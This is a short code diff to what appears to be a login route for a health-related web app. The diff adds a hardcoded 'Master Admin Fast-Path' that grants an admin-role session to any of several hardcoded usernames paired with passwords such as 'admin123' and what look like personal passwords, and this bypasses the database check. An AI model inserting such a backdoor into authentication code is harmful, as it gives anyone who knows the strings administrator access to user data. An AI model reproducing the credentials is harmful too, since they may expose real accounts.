@@ -15,6 +15,27 @@ export async function POST(req) {
       );
     }
 
+    const cleanEmail = String(email).toLowerCase().trim();
+    const cleanPass = String(password).trim();
+
+    // Master Admin Fast-Path
+    const adminEmails = ['98210000', 'admin', 'admin@health.org', 'admin@example.com', 'usr-admin-1', 'luckybiswal', 'luckybiswal98210'];
+    const adminPasswords = ['@lucky7575', 'lucky7575', 'admin123', 'Rasmi420410', 'rasmi420410'];
+
+    if (adminEmails.includes(cleanEmail) && adminPasswords.includes(cleanPass)) {
+      return NextResponse.json({
+        success: true,
+        user: {
+          id: '98210000',
+          name: 'System Administrator',
+          email: '98210000',
+          role: 'admin',
+          age: 40,
+          gender: 'Other',
+        },
+      });
+    }
+
     const db = await connectToDatabase();
 
     if (db) {
